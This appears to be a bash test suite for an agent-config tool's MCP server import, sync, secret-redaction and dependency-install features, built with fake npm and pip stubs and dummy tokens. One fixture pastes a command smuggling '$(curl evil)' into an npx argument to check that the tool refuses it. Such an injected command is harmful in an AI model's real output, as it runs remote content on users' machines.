#!/usr/bin/env bash
. "$(dirname "$0")/../lib.sh"
# what this section needs that the old one-file run.sh had done before it
cd "$T"
# ---------- MCP: a pasted setup, URL servers, secrets as ${VAR}, packages (kit new mcp --config, install-deps mcp) ----------
MT="$T/mcpt"; MH="$MT/home"; MS="$MT/src"; MB="$MT/bin"; mkdir -p "$MH/.codex" "$MH/.omp/agent" "$MS" "$MB"
printf 'name: src\n' > "$MS/kit.yaml"
mk() { HOME="$MH" AGENTKIT_CONFIG="$MH/.config/agentkit" AGENTKIT_SOURCES="$MH/agentkit" PATH="$MB:$PATH" "$KIT" "$@"; }
mkp() { HOME="$MH" AGENTKIT_CONFIG="$MH/.config/agentkit" AGENTKIT_SOURCES="$MH/agentkit" PATH="$MB:$PATH" "$PWSH" -NoProfile -File "$HERE/../windows/kit.ps1" "$@"; }
mj() { python3 -c "import json,sys;d=json.load(open(sys.argv[1]));exec(sys.argv[2])" "$@"; }
# a fake npm: "view" says 9.8.7; "install" makes the package with a bin (no network)
cat > "$MB/npm" <<EOF
#!/bin/sh
echo "\$PWD \$*" >> "$MT/npm.log"
case \$1 in
view) case \$2 in
      *@^1) printf '%s\\n' "rng-srv@1.2.0 '1.2.0'" "rng-srv@1.10.1 '1.10.1'" "rng-srv@1.10.1-rc.1 '1.10.1-rc.1'" "rng-srv@1.9.0 '1.9.0'";;
      *@next) echo 2.0.0-rc.1;;
      *) echo 9.8.7;;
      esac;;
install) p=\$(sed -n 's/.*"dependencies": {"\\([^"]*\\)".*/\\1/p' package.json); mkdir -p "node_modules/\$p/dist"
         printf '{"name": "%s", "bin": {"gh-srv": "dist/cli.js"}}\\n' "\$p" > "node_modules/\$p/package.json"; echo x > "node_modules/\$p/dist/cli.js";;
esac
EOF
chmod +x "$MB/npm"
# a fake python3 for the venv: venv/bin/python, whose pip makes venv/bin/<package>
printf '#!/bin/sh\nL=%s\n' "$MT" > "$MB/python3"
cat >> "$MB/python3" <<'EOF'
echo "$PWD $*" >> "$L/py.log"
[ "$1 $2" = "-m venv" ] || exit 0
mkdir -p "$3/bin"; printf '#!/bin/sh\nL=%s\n' "$L" > "$3/bin/python"
cat >> "$3/bin/python" <<'PEOF'
echo "$*" >> "$L/pip.log"
d=$(dirname "$0"); n=$(sed 's/[=<>].*//; s/\[.*//' requirements.txt)
for b in "$n" ctx; do printf '#!/bin/sh\n' > "$d/$b"; chmod +x "$d/$b"; done
PEOF
chmod +x "$3/bin/python"
EOF
chmod +x "$MB/python3"
# a local PyPI (its JSON API): <name>/json
mkdir -p "$MT/pypi/ctx-srv"; printf '{"info": {"version": "3.1.4"}}\n' > "$MT/pypi/ctx-srv/json"
cat > "$MT/serve" <<'PYEOF'
import functools, http.server, sys
s = http.server.HTTPServer(("127.0.0.1", 0), functools.partial(http.server.SimpleHTTPRequestHandler, directory=sys.argv[1]))
open(sys.argv[2], "w").write(str(s.server_address[1]))
s.serve_forever()
PYEOF
python3 -I "$MT/serve" "$MT/pypi" "$MT/port" >/dev/null 2>&1 & MPYPI=$!
for i in 1 2 3 4 5 6 7 8 9 10; do [ -s "$MT/port" ] && break; sleep 1; done
export KIT_PYPI_URL="http://127.0.0.1:$(cat "$MT/port")"
mk init "$MS" >/dev/null 2>&1
# secrets (made here, not written out in the test file): never in any output or file kit writes
S1="ghp""_Zq7Lm2Xc9Vb4Nn8Kk3Jj6Hh1Gg5Ff0Dd2Ss4"; S2="tok""Val-9f8e7d"; S3="Ab3""dEf5GhIj7KlMn9PqRs1Tu"; S4="pw""Secret77"
cat > "$MT/two.json" <<EOF
{"mcpServers": {
  "GitHub Server": {"command": "npx", "args": ["-y", "@modelcontextprotocol/server-github"], "env": {"GITHUB_PERSONAL_ACCESS_TOKEN": "$S1", "LOG_LEVEL": "info"}},
  "web": {"type": "http", "url": "https://mcp.example.com/mcp?lang=en", "headers": {"Authorization": "Bearer $S2", "X-Api-Key": "$S3", "X-Plain": "v1"}}}}
EOF
out=$(mk new mcp --config "$MT/two.json" --look 2>"$MT/err"); rc=$?
check "paste: several servers -> several_servers with their names, nothing written" '[ $rc -ne 0 ] && mj /dev/stdin "e=d[\"error\"];assert e[\"code\"]==\"several_servers\" and e[\"servers\"]==[\"GitHub Server\",\"web\"]" <<< "$out" && [ ! -e "$MS/mcp" ]'
out=$(mk new mcp nope --config "$MT/two.json" --look 2>/dev/null); rc=$?
check "paste: a name not in it -> not_found" '[ $rc -ne 0 ] && echo "$out" | grep -q "\"code\": \"not_found\""'
out=$(mk new mcp github-server --config "$MT/two.json" --look 2>"$MT/err"); rc=$?; echo "$out" > "$MT/look1.json"
check "paste --look (JSON): one line, name, type, secrets by name, vars, requires, pinned package" '[ $rc -eq 0 ] && [ "$(echo "$out" | wc -l | tr -d " ")" = 1 ] && mj "$MT/look1.json" "assert d[\"name\"]==\"github-server\" and d[\"source\"]==\"src\" and d[\"exists\"]==False and d[\"type\"]==\"stdio\" and d[\"secrets\"]==[{\"where\":\"env.GITHUB_PERSONAL_ACCESS_TOKEN\",\"var\":\"GITHUB_PERSONAL_ACCESS_TOKEN\"}] and d[\"vars\"]==[\"GITHUB_PERSONAL_ACCESS_TOKEN\"] and d[\"requires\"]==[\"node\"] and d[\"packages\"]==[{\"kind\":\"npm\",\"package\":\"@modelcontextprotocol/server-github\",\"version\":\"9.8.7\",\"bad\":\"\"}] and \"server-github@9.8.7\" in d[\"yaml\"] and d[\"path\"].endswith(\"/mcp/github-server.yaml\")"'
check "paste --look: npm view ran outside the source (no .npmrc of a project)" 'grep -q "view @modelcontextprotocol/server-github version" "$MT/npm.log" && ! grep -q "^$MS " "$MT/npm.log"'
check "paste --look writes nothing" '[ ! -e "$MS/mcp" ]'
out=$(mk new mcp github-server --config "$MT/two.json" 2>&1); rc=$?
check "paste: writes mcp/<name>.yaml, says the variable names" '[ $rc -eq 0 ] && [ -f "$MS/mcp/github-server.yaml" ] && echo "$out" | grep -qF "\${GITHUB_PERSONAL_ACCESS_TOKEN}" && grep -qx "  GITHUB_PERSONAL_ACCESS_TOKEN: \${GITHUB_PERSONAL_ACCESS_TOKEN}" "$MS/mcp/github-server.yaml" && grep -qx "  - \"@modelcontextprotocol/server-github@9.8.7\"" "$MS/mcp/github-server.yaml"'
out=$(mk new mcp web --config "$MT/two.json" 2>&1); rc=$?
check "paste http: type, url, secret headers as \${VAR}, Bearer kept" '[ $rc -eq 0 ] && grep -qx "type: http" "$MS/mcp/web.yaml" && grep -qxF "url: \"https://mcp.example.com/mcp?lang=en\"" "$MS/mcp/web.yaml" && grep -qxF "  X-Api-Key: \${WEB_API_KEY}" "$MS/mcp/web.yaml" && grep -qxF "  Authorization: \"Bearer \${WEB_TOKEN}\"" "$MS/mcp/web.yaml" && grep -qx "  X-Plain: v1" "$MS/mcp/web.yaml"'
out=$(mk new mcp web --config "$MT/two.json" 2>/dev/null); rc=$?
check "paste: the name is taken -> exists" '[ $rc -ne 0 ]'
out=$(mk new mcp web --config "$MT/two.json" --look 2>/dev/null)
check "paste --look: an existing name says exists, its path" 'mj /dev/stdin "assert d[\"exists\"]==True and d[\"path\"].endswith(\"/mcp/web.yaml\")" <<< "$out"'
# the other forms: claude mcp add (http, stdio), codex mcp add, Codex config.toml, a bare object
printf '%s \\\n  %s\n' 'claude mcp add --transport sse -s user events https://events.example.com/sse' "-H \"X-Api-Key: $S3\"" > "$MT/c1.txt"
out=$(mk new mcp --config "$MT/c1.txt" 2>&1); rc=$?
check "paste claude mcp add (sse, -H, a line continued with \\)" '[ $rc -eq 0 ] && grep -qx "type: sse" "$MS/mcp/events.yaml" && grep -qxF "  X-Api-Key: \${EVENTS_API_KEY}" "$MS/mcp/events.yaml"'
printf '%s\n' "claude mcp add ctx -e API_KEY=$S4 -e MODE=fast -- uvx --from ctx-srv ctx --verbose" > "$MT/c2.txt"
out=$(mk new mcp --config "$MT/c2.txt" 2>&1); rc=$?
check "paste claude mcp add (stdio, -e): the PyPI version pinned (--from pkg==ver)" '[ $rc -eq 0 ] && grep -qx "  - ctx-srv==3.1.4" "$MS/mcp/ctx.yaml" && grep -qxF "  API_KEY: \${API_KEY}" "$MS/mcp/ctx.yaml" && grep -qx "  MODE: fast" "$MS/mcp/ctx.yaml"'
printf '%s\n' 'codex mcp add docs --env DOCS_TOKEN=$DOCS_TOKEN -- node /opt/docs/server.js' > "$MT/c3.txt"
out=$(mk new mcp --config "$MT/c3.txt" 2>&1); rc=$?
check "paste codex mcp add: \$VAR becomes \${VAR}" '[ $rc -eq 0 ] && grep -qxF "  DOCS_TOKEN: \${DOCS_TOKEN}" "$MS/mcp/docs.yaml" && grep -qx "command: node" "$MS/mcp/docs.yaml"'
cat > "$MT/c4.toml" <<'EOF'
# Codex
[mcp_servers.st]
command = "node"
args = [
  "-y", # a comment
  'lit\eral',
]
env_vars = ["ST_TOKEN"]
[mcp_servers.st.env]
FOO = "bar"

[mcp_servers.remote]
url = "https://r.example.com/mcp"
bearer_token_env_var = "R_TOKEN"
http_headers = { "X-Team" = "a" }
startup_timeout_sec = 20
EOF
out=$(mk new mcp --config "$MT/c4.toml" --look 2>/dev/null); rc=$?
check "paste Codex config.toml: two servers -> several_servers" '[ $rc -ne 0 ] && echo "$out" | grep -qF "\"servers\": [\"st\", \"remote\"]"'
mk new mcp st --config "$MT/c4.toml" --look > "$MT/look-st.json" 2>/dev/null
check "paste Codex config.toml (stdio): args over lines, comments, a literal string, env_vars -> \${VAR}, env table" 'mj "$MT/look-st.json" "y=d[\"yaml\"].split(chr(10));assert d[\"type\"]==\"stdio\" and \"  - -y\" in y and \"  - \"+chr(39)+\"lit\"+chr(92)+\"eral\"+chr(39) in y and \"  ST_TOKEN: \${ST_TOKEN}\" in y and \"  FOO: bar\" in y, y"'
out=$(mk new mcp remote --config "$MT/c4.toml" 2>&1); rc=$?
check "paste Codex config.toml (bearer_token_env_var -> Authorization: Bearer \${VAR})" '[ $rc -eq 0 ] && grep -qxF "  Authorization: \"Bearer \${R_TOKEN}\"" "$MS/mcp/remote.yaml" && grep -qx "  X-Team: a" "$MS/mcp/remote.yaml"'
printf '{"q": {"url": "https://q.example.com/mcp?token=%s"}}\n' "$S3" > "$MT/c8.json"
out=$(mk new mcp --config "$MT/c8.json" 2>&1); rc=$?
check "paste: a url without type is http, a secret in its query becomes \${VAR}" '[ $rc -eq 0 ] && grep -qx "type: http" "$MS/mcp/q.yaml" && grep -qxF "url: \"https://q.example.com/mcp?token=\${Q_TOKEN}\"" "$MS/mcp/q.yaml"'
printf '{"command": "docker", "args": ["run", "-i", "--rm", "img"]}\n' > "$MT/c5.json"
out=$(mk new mcp --config "$MT/c5.json" --look 2>/dev/null); rc=$?
check "paste a bare object without a name -> no_name" '[ $rc -ne 0 ] && echo "$out" | grep -q "\"code\": \"no_name\""'
out=$(mk new mcp dock --config "$MT/c5.json" --look 2>/dev/null)
check "paste docker: needs docker, no package" 'mj /dev/stdin "assert d[\"requires\"]==[\"docker\"] and d[\"packages\"]==[]" <<< "$out"'
printf '{"x": {"command": "a",' > "$MT/c6.json"
out=$(mk new mcp --config "$MT/c6.json" --look 2>/dev/null); rc=$?
check "paste: not JSON -> bad_config" '[ $rc -ne 0 ] && echo "$out" | grep -q "\"code\": \"bad_config\""'
printf '%s\n' 'claude mcp add x -- npx $(curl evil)' > "$MT/c7.txt"
out=$(mk new mcp --config "$MT/c7.txt" --look 2>/dev/null); rc=$?
check "paste: \$( ) is refused" '[ $rc -ne 0 ] && echo "$out" | grep -q "\"code\": \"bad_config\""'
out=$(printf '%s\n' "claude mcp add piped -e K=v -- uvx piped-srv@2.0.0" | mk new mcp --config - --look 2>/dev/null)
check "paste from stdin (--config -)" 'mj /dev/stdin "assert d[\"name\"]==\"piped\" and d[\"packages\"][0][\"version\"]==\"2.0.0\"" <<< "$out"'
# more secrets: a name with PASS / PWD in it, a secret as the default of ${VAR:-…}; words are not secrets
printf '{"1Password": {"command": "npx", "args": ["-y", "rng-srv@^1", "--workspace=AcmeCorpProduction2024", "https://h.example.com/WorkspaceAcme2024Main/mcp", "--key=%s"], "env": {"DB_PASS": "%s", "MYSQL_PWD": "x%s", "API_TOKEN": "${API_TOKEN:-%s}", "LOG": "${LOG_LEVEL:-info}"}}}\n' "$S3" "$S4" "$S4" "$S1" > "$MT/c9.json"
out=$(mk new mcp --config "$MT/c9.json" --look 2>/dev/null); rc=$?; echo "$out" > "$MT/look9.json"
check "paste: DB_PASS, MYSQL_PWD and a secret default \${VAR:-…} become \${VAR}; a name starting with a digit gets MCP_" '[ $rc -eq 0 ] && mj "$MT/look9.json" "assert d[\"name\"]==\"1password\" and d[\"secrets\"]==[{\"where\":\"env.API_TOKEN\",\"var\":\"API_TOKEN\"},{\"where\":\"env.DB_PASS\",\"var\":\"DB_PASS\"},{\"where\":\"env.MYSQL_PWD\",\"var\":\"MYSQL_PWD\"},{\"where\":\"args[5]\",\"var\":\"MCP_1PASSWORD_KEY\"}], d[\"secrets\"]; y=d[\"yaml\"].split(chr(10)); assert \"  API_TOKEN: \${API_TOKEN}\" in y and \"  LOG: \${LOG_LEVEL:-info}\" in y and \"  - --key=\${MCP_1PASSWORD_KEY}\" in y, y"'
check "paste: words and a URL path of words are not secrets" 'mj "$MT/look9.json" "y=d[\"yaml\"].split(chr(10)); assert \"  - --workspace=AcmeCorpProduction2024\" in y and \"  - https://h.example.com/WorkspaceAcme2024Main/mcp\" in y, y"'
check "paste: an npm range is pinned to the highest version that matches it (asked with the range), and says so" 'mj "$MT/look9.json" "assert d[\"packages\"][0][\"version\"]==\"1.10.1\" and \"  - rng-srv@1.10.1\" in d[\"yaml\"].split(chr(10)) and d[\"warnings\"]==[\"套件 rng-srv 原本寫 @^1：固定在 1.10.1 版（符合 ^1 的最新版本）\"], d" && grep -q "view rng-srv@^1 version" "$MT/npm.log"'
printf '{"nx": {"command": "npx", "args": ["tag-srv@next", "--x"]}}\n' > "$MT/c10.json"
out=$(mk new mcp --config "$MT/c10.json" --look 2>/dev/null)
check "paste: an npm tag is pinned to its version, and says so" 'mj /dev/stdin "assert d[\"packages\"][0][\"version\"]==\"2.0.0-rc.1\" and \"tag-srv@2.0.0-rc.1\" in d[\"yaml\"] and \"原本寫 @next：固定在 2.0.0-rc.1 版\" in d[\"warnings\"][0]" <<< "$out"'
printf '{"mcpServers": {"\342\204\252ube": {"command": "x"}}}\n' > "$MT/c11.json"
out=$(mk new mcp --config "$MT/c11.json" --look 2>/dev/null)
check "paste: the name is made from A-Z, a-z, 0-9 only (the Kelvin sign is not a k)" 'mj /dev/stdin "assert d[\"name\"]==\"ube\"" <<< "$out"'
printf '%s\n' "claude mcp add --transport http 1pw https://pw.example.com/mcp -H \"Authorization: Bearer $S2\"" > "$MT/c12.txt"
out=$(mk new mcp --config "$MT/c12.txt" --look 2>/dev/null)
check "paste: a header secret of a server named 1pw -> \${MCP_1PW_TOKEN}" 'mj /dev/stdin "assert d[\"secrets\"]==[{\"where\":\"headers.Authorization\",\"var\":\"MCP_1PW_TOKEN\"}]" <<< "$out"'
# gawk 5.2.1 (Debian/Ubuntu's awk) died with "free(): double free" in mcp.awk when an element it never set (no url: F[j, "url"];
# an args item it skips) went to a function and was read and set again later: kit add, kit sync, kit list stopped there
printf '%s\n' 'claude mcp add codegraph -- codegraph serve --mcp' > "$MT/c13.txt"
out=$(mk new mcp --config "$MT/c13.txt" 2>&1); rc=$?
out2=$(LC_ALL=C awk -f "$HERE/../unix/yaml.awk" "$MS/mcp/codegraph.yaml" | LC_ALL=C awk -f "$HERE/../unix/mcp.awk" -v mode=yaml -v name=codegraph 2>&1); rc2=$?
check "paste a server without a url (codegraph serve --mcp), then read its yaml (kit add, sync, list): no crash, stdio" '[ $rc -eq 0 ] && [ $rc2 -eq 0 ] && [ "$out2" = "$(printf "T\tstdio")" ] && grep -qx "command: codegraph" "$MS/mcp/codegraph.yaml"'
printf '{"cg": {"command": "x", "args": [{"b": 2}, "y"]}}\n' > "$MT/c14.json"
out=$(mk new mcp --config "$MT/c14.json" --look 2>/dev/null); rc=$?
check "paste: an args item kit skips ({...}) is an empty one, no crash" '[ $rc -eq 0 ] && mj /dev/stdin "y=d[\"yaml\"].split(chr(10));assert \"  - \\\"\\\"\" in y and \"  - \\\"y\\\"\" in y, y" <<< "$out"'
# kit new: a failure is a failure (the error JSON only, exit not 0, nothing said to be made)
out=$(mk new mcp dock --config "$MT/c5.json" --to nosuch --look 2>/dev/null); rc=$?
check "new mcp --look --to nosuch: only the error JSON, exit 1" '[ $rc -ne 0 ] && [ "$(echo "$out" | wc -l | tr -d " ")" = 1 ] && echo "$out" | grep -qF "\"code\": \"no_source\""'
out=$(mk new mcp dock --config "$MT/c5.json" --to nosuch 2>&1); rc=$?
check "new mcp --to nosuch: exit 1, nothing made" '[ $rc -ne 0 ] && ! echo "$out" | grep -q "已建立" && [ ! -e "$MS/mcp/dock.yaml" ]'
out=$(mk new rule zz --to nosuch 2>&1); rc=$?
check "new rule --to nosuch: exit 1, nothing made" '[ $rc -ne 0 ] && ! echo "$out" | grep -q "已建立"'
chmod 555 "$MS/mcp"
out=$(mk new mcp dock --config "$MT/c5.json" 2>&1); rc=$?
check "new mcp: a file kit cannot write is an error" '[ $rc -ne 0 ] && echo "$out" | grep -qF "沒辦法寫" && ! echo "$out" | grep -q "已建立"'
out=$(mk new mcp dock2 2>&1); rc=$?
check "new mcp (skeleton): a file kit cannot write is an error" '[ $rc -ne 0 ] && echo "$out" | grep -qF "沒辦法寫" && ! echo "$out" | grep -q "已建立"'
chmod 755 "$MS/mcp"
check "check: the pasted ones pass" 'mk check "$MS" >/dev/null 2>&1'
# kit check refuses a secret written in the source, without printing it
printf 'command: x\nenv:\n  API_TOKEN: %s\n' "$S4" > "$MS/mcp/leak.yaml"
out=$(mk check "$MS" 2>&1); rc=$?
check "check: a literal secret in an MCP yaml fails, the value is not printed" '[ $rc -ne 0 ] && echo "$out" | grep -qF "mcp/leak.yaml: env.API_TOKEN 看起來是密碼或 token" && ! echo "$out" | grep -qF "$S4"'
rm -f "$MS/mcp/leak.yaml"
printf 'command: x\nenv:\n  DB_PASS: %s\n' "$S4" > "$MS/mcp/leak.yaml"
out=$(mk check "$MS" 2>&1); rc=$?
check "check: DB_PASS written in the yaml fails" '[ $rc -ne 0 ] && echo "$out" | grep -qF "env.DB_PASS 看起來是密碼或 token" && ! echo "$out" | grep -qF "$S4"'
printf 'command: x\nenv:\n  API_TOKEN: ${API_TOKEN:-%s}\n  LOG: ${LOG:-info}\n' "$S4" > "$MS/mcp/leak.yaml"
out=$(mk check "$MS" 2>&1); rc=$?
check "check: a secret as the default of \${VAR:-…} fails (a plain default does not)" '[ $rc -ne 0 ] && echo "$out" | grep -qF "env.API_TOKEN 看起來是密碼或 token" && ! echo "$out" | grep -q "env.LOG" && ! echo "$out" | grep -qF "$S4"'
printf 'command: x\nargs: [--workspace=AcmeCorpProduction2024, "--id=%s", --path=WorkspaceAcme2024Main]\n' "$S3" > "$MS/mcp/leak.yaml"
out=$(mk check "$MS" 2>&1); rc=$?
check "check: a long random value fails, words do not" '[ $rc -ne 0 ] && echo "$out" | grep -qF "args[2] 看起來是密碼或 token" && ! echo "$out" | grep -qF "args[1]" && ! echo "$out" | grep -qF "args[3]"'
printf 'not_secret: ["args[2]"]\n' >> "$MS/mcp/leak.yaml"
out=$(mk check "$MS" 2>&1); rc=$?
check "check: not_secret: [args[2]] lets it pass" '[ $rc -eq 0 ]'
mk list --json > "$MT/list-ns.json" 2>/dev/null
check "list --json: a not_secret field is no variable" 'mj "$MT/list-ns.json" "i={x[\"name\"]:x for x in d[\"items\"]};assert i[\"leak\"][\"vars\"]==[]"'
if [ -n "$PWSH" ]; then
  out=$(mkp check "$MS" 2>&1); rc=$?
  check "kit.ps1 check: not_secret honoured too" '[ $rc -eq 0 ]'
  a=$(mk list --json 2>/dev/null); b=$(mkp list --json 2>/dev/null)
  check "kit.ps1: the same list --json with not_secret" '[ "$a" = "$b" ]'
fi
rm -f "$MS/mcp/leak.yaml"
printf 'type: ftp\nurl: x\n' > "$MS/mcp/badtype.yaml"
out=$(mk check "$MS" 2>&1); rc=$?
check "check: a type kit does not know" '[ $rc -ne 0 ] && echo "$out" | grep -qF "type 只能是 stdio、http 或 sse"'
rm -f "$MS/mcp/badtype.yaml"
# sync: each tool's file, stdio and http
: > "$MT/add.err"; for n in github-server web events ctx docs q; do mk add mcp $n >/dev/null 2>>"$MT/add.err"; done
CJ="$MH/.claude.json"
check "Claude: stdio as before (no type), env with \${VAR}" 'mj "$CJ" "s=d[\"mcpServers\"][\"github-server\"];assert \"type\" not in s and s[\"command\"]==\"npx\" and s[\"env\"][\"GITHUB_PERSONAL_ACCESS_TOKEN\"]==\"\${GITHUB_PERSONAL_ACCESS_TOKEN}\""'
check "Claude: http and sse with type, url, headers" 'mj "$CJ" "w=d[\"mcpServers\"][\"web\"];e=d[\"mcpServers\"][\"events\"];assert w==dict(type=\"http\",url=\"https://mcp.example.com/mcp?lang=en\",headers={\"Authorization\":\"Bearer \${WEB_TOKEN}\",\"X-Api-Key\":\"\${WEB_API_KEY}\",\"X-Plain\":\"v1\"}) and e[\"type\"]==\"sse\""'
check "omp: the same JSON" 'mj "$MH/.omp/agent/mcp.json" "w=d[\"mcpServers\"][\"web\"];assert w[\"type\"]==\"http\" and w[\"headers\"][\"Authorization\"]==\"Bearer \${WEB_TOKEN}\""'
CT="$MH/.codex/config.toml"
check "Codex http: url, bearer_token_env_var, env_http_headers, http_headers" 'grep -qxF "[mcp_servers.web]" "$CT" && grep -qxF "url = \"https://mcp.example.com/mcp?lang=en\"" "$CT" && grep -qxF "bearer_token_env_var = \"WEB_TOKEN\"" "$CT" && grep -qxF "env_http_headers = { X-Api-Key = \"WEB_API_KEY\" }" "$CT" && grep -qxF "http_headers = { X-Plain = \"v1\" }" "$CT"'
check "Codex: a \${VAR} in the url is left out (Codex does not expand it), said once; Claude has it" '! grep -q "mcp_servers.q" "$CT" && grep -q "q" "$MT/add.err" && mj "$CJ" "assert d[\"mcpServers\"][\"q\"][\"url\"]==\"https://q.example.com/mcp?token=\${Q_TOKEN}\""'
check "Codex stdio: an env that is \${ITSELF} -> env_vars" 'grep -qxF "env_vars = [\"GITHUB_PERSONAL_ACCESS_TOKEN\"]" "$CT" && grep -qxF "env_vars = [\"DOCS_TOKEN\"]" "$CT" && grep -qxF "LOG_LEVEL = \"info\"" "$CT"'
check "Codex: no SSE (left out, said once)" '! grep -q "mcp_servers.events" "$CT" && grep -qF "Codex 不能用 SSE 的 MCP：events" "$MT/add.err"'
if python3 -c "import tomllib" 2>/dev/null; then
  check "Codex: the block is valid TOML" 'python3 -c "import tomllib,sys;d=tomllib.load(open(sys.argv[1],\"rb\"))[\"mcp_servers\"];assert d[\"web\"][\"http_headers\"]=={\"X-Plain\":\"v1\"} and d[\"web\"][\"bearer_token_env_var\"]==\"WEB_TOKEN\" and d[\"github-server\"][\"env_vars\"]==[\"GITHUB_PERSONAL_ACCESS_TOKEN\"]" "$CT"'
fi
out=$(mk sync 2>&1)
check "sync: a variable this machine has not set is told once" '! echo "$out" | grep -q "WEB_TOKEN" && grep -q "var:WEB_TOKEN" "$MH/.config/agentkit/state.tsv"'
mk list --json > "$MT/list.json" 2>/dev/null
check "list --json: mcp type, vars, needs, packages (not installed)" 'mj "$MT/list.json" "i={x[\"name\"]:x for x in d[\"items\"]};g=i[\"github-server\"];w=i[\"web\"];assert g[\"type\"]==\"stdio\" and g[\"vars\"]==[{\"name\":\"GITHUB_PERSONAL_ACCESS_TOKEN\",\"set\":False}] and [n[\"tool\"] for n in g[\"needs\"]]==[\"node\"] and g[\"packages\"][0][\"package\"]==\"@modelcontextprotocol/server-github\" and g[\"packages\"][0][\"version\"]==\"9.8.7\" and g[\"packages\"][0][\"ok\"]==False and w[\"type\"]==\"http\" and w[\"packages\"]==[] and i[\"docs\"][\"packages\"]==[]"'
out=$(mk list 2>&1)
check "list: an MCP downloaded at each start says how to install it" 'echo "$out" | grep -qF "mcp:github-server 每次啟動時下載 @modelcontextprotocol/server-github（先裝好：kit install-deps mcp github-server）"'
# install-deps mcp: npm (fake), then each tool runs the installed copy
out=$(mk install-deps mcp github-server 2>&1); rc=$?
MD="$MH/.config/agentkit/mcp-deps/github-server"
check "install-deps mcp (npm): in kit's mcp-deps, --ignore-scripts, the pinned version" '[ $rc -eq 0 ] && grep -q "install --ignore-scripts --omit=dev --no-audit --no-fund" "$MT/npm.log" && grep -qF "\"@modelcontextprotocol/server-github\": \"9.8.7\"" "$MD/.kit-src/package.json" && [ -f "$MD/node_modules/@modelcontextprotocol/server-github/dist/cli.js" ]'
check "installed: Claude runs node with the package's bin, its own args kept" 'mj "$CJ" "s=d[\"mcpServers\"][\"github-server\"];assert s[\"command\"]==\"node\" and s[\"args\"]==[sys.argv[3]]" "$MD/node_modules/@modelcontextprotocol/server-github/dist/cli.js"'
check "installed: Codex too" 'grep -qxF "command = \"node\"" "$CT"'
out=$(mk install-deps mcp ctx 2>&1); rc=$?
MP="$MH/.config/agentkit/mcp-deps/ctx"
check "install-deps mcp (pip): a venv, the pinned version, then the tools run its program" '[ $rc -eq 0 ] && [ "$(cat "$MP/.kit-src/requirements.txt")" = "ctx-srv==3.1.4" ] && grep -q "only-binary=:all:" "$MT/pip.log" && mj "$CJ" "s=d[\"mcpServers\"][\"ctx\"];assert s[\"command\"]==sys.argv[3] and s[\"args\"]==[\"--verbose\"]" "$MP/venv/bin/ctx"'
out=$(mk install-deps mcp docs 2>&1); rc=$?
check "install-deps mcp: nothing to install" '[ $rc -eq 0 ] && echo "$out" | grep -qF "不用另外裝套件"'
mk list --json > "$MT/list2.json" 2>/dev/null
check "list --json: installed -> ok" 'mj "$MT/list2.json" "i={x[\"name\"]:x for x in d[\"items\"]};assert i[\"github-server\"][\"packages\"][0][\"ok\"]==True and i[\"ctx\"][\"packages\"][0][\"ok\"]==True"'
# kit run --tool codex: the http server inline
mkdir -p "$MS/agents"; printf -- '---\nname: webby\ndescription: x\nmcp: [web, events]\n---\nx\n' > "$MS/agents/webby.md"
out=$(KIT_DRY_RUN=1 mk run webby --tool codex 2>&1)
check "kit run --tool codex: an http server inline (url, bearer_token_env_var, env_http_headers); no SSE" 'echo "$out" | grep -qF "mcp_servers.web={url=\"https://mcp.example.com/mcp?lang=en\", bearer_token_env_var=\"WEB_TOKEN\"" && echo "$out" | grep -qF "env_http_headers={ X-Api-Key = \"WEB_API_KEY\" }" && ! echo "$out" | grep -q "mcp_servers.events="'
check "the secrets are in no file kit wrote" '! grep -rqF -e "$S1" -e "$S2" -e "$S3" -e "$S4" "$MH" "$MS"'
check "the skeleton shows both forms" 'mk new mcp skel >/dev/null 2>&1 && grep -qx "command: （啟動 MCP server 的程式，例如 npx 或 uvx）" "$MS/mcp/skel.yaml" && grep -qx "# type: http          # 或 sse" "$MS/mcp/skel.yaml" && mk check "$MS" >/dev/null 2>&1'
rm -f "$MS/mcp/skel.yaml"
if [ -n "$PWSH" ]; then
  for f in two.json c1.txt c2.txt c3.txt c4.toml c5.json c6.json c8.json c9.json c10.json c11.json c12.txt; do
    for nm in "" github-server web st remote; do
      a=$(mk new mcp $nm --config "$MT/$f" --look 2>/dev/null); b=$(mkp new mcp $nm --config "$MT/$f" --look 2>/dev/null)
      [ "$a" = "$b" ] || { echo "parity --look $f $nm:"; echo "$a"; echo "$b"; PDIFF=1; }
    done
  done
  check "kit.ps1: the same --look JSON for every paste (and the same errors)" '[ -z "${PDIFF:-}" ]'
  a=$(mk new mcp dock --config "$MT/c5.json" --to nosuch --look 2>/dev/null; echo "rc=$?"); b=$(mkp new mcp dock --config "$MT/c5.json" --to nosuch --look 2>/dev/null; echo "rc=$?")
  check "kit.ps1: new mcp --look --to nosuch: the same error JSON, exit 1" '[ "$a" = "$b" ] && echo "$a" | grep -qx "rc=1"'
  out=$(printf '%s\n' "claude mcp add u8 -e NOTE=é漢 -- uvx u8-srv@2.0.0" | mkp new mcp --config - --look 2>/dev/null)
  check "kit.ps1: --config - reads UTF-8" 'mj /dev/stdin "assert \"é漢\" in d[\"yaml\"]" <<< "$out"'
  a=$(mk list --json 2>/dev/null); b=$(mkp list --json 2>/dev/null)
  check "kit.ps1: the same list --json with MCP packages, installed and not" '[ "$a" = "$b" ]'
  mkp sync >/dev/null 2>&1
  check "kit.ps1 sync: the same Claude JSON and Codex block" 'mj "$CJ" "s=d[\"mcpServers\"];assert s[\"github-server\"][\"command\"]==\"node\" and s[\"web\"][\"type\"]==\"http\"" && grep -qxF "bearer_token_env_var = \"WEB_TOKEN\"" "$CT" && grep -qxF "env_vars = [\"DOCS_TOKEN\"]" "$CT"'
  out=$(mkp check "$MS" 2>&1); printf 'command: x\nenv:\n  API_TOKEN: %s\n' "$S4" > "$MS/mcp/leak.yaml"; out=$(mkp check "$MS" 2>&1); rc=$?; rm -f "$MS/mcp/leak.yaml"
  check "kit.ps1 check: a literal secret fails, not printed" '[ $rc -ne 0 ] && echo "$out" | grep -qF "env.API_TOKEN 看起來是密碼或 token" && ! echo "$out" | grep -qF "$S4"'
fi
{ kill $MPYPI; wait $MPYPI; } 2>/dev/null; unset KIT_PYPI_URL

finish
